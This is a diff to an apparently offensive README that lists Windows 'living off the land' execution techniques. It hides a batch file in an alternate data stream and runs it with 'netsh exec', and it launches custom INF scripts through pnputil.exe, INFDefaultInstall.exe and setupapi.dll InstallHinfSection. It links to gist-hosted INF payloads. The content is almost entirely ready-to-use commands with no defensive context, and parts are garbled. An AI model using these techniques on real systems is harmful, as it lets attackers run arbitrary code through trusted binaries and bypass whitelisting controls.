@@ -17,11 +17,24 @@ cmd.exe:> type C:\Users\Gihad\Desktop\file.bat > C:\Users\Gihad\Desktop\test.txt
 cmd.exe:> netsh exec C:\Users\Gihad\Desktop\test.txt:x22x2
 ```
 
-## pnputil.exe Launcher .INF:>
+## pnputil.exe Launcher .INF:> Note This Eveything here .INF Work on My Script INFscript Only !
 -------------------------------------------------------------
 ```
 pnputil.exe /add-driver C:\FilesINFExecution.inf /install
 
 &- My Code INFScript Injection Command Line 
-https://gist.github.com/homjxi0e/87b29da0d4f504cb675bb1140a931415/raw/49ae512570f8efafee806af85ed456c813921877/SCTINF.inf
+https://gist.githubusercontent.com/homjxi0e/a27e34d7be34731fb637e820c883c8bc/raw/1414b5efd3f1c35d56382b1a1dfe7b455f1fe9bc/INFPS.inf
+```
+## INFDefaultInstall Launch Execute INFScript 
+```
+INFDefaultInstall.exe C:\INFPS.inf
+&-  Code INFScript 
+https://gist.githubusercontent.com/homjxi0e/a27e34d7be34731fb637e820c883c8bc/raw/1414b5efd3f1c35d56382b1a1dfe7b455f1fe9bc/INFPS.inf
+```
+
+## setupapi.dll Launch Execute My INFScript 
+```
+setupapi.dll,InstallHinfSection DefaultInstall 132 C:\Users\Gihad\Desktop\INFPS.inf
+&-  Code INFScript 
+https://gist.githubusercontent.com/homjxi0e/a27e34d7be34731fb637e820c883c8bc/raw/1414b5efd3f1c35d56382b1a1dfe7b455f1fe9bc/INFPS.inf
 ```
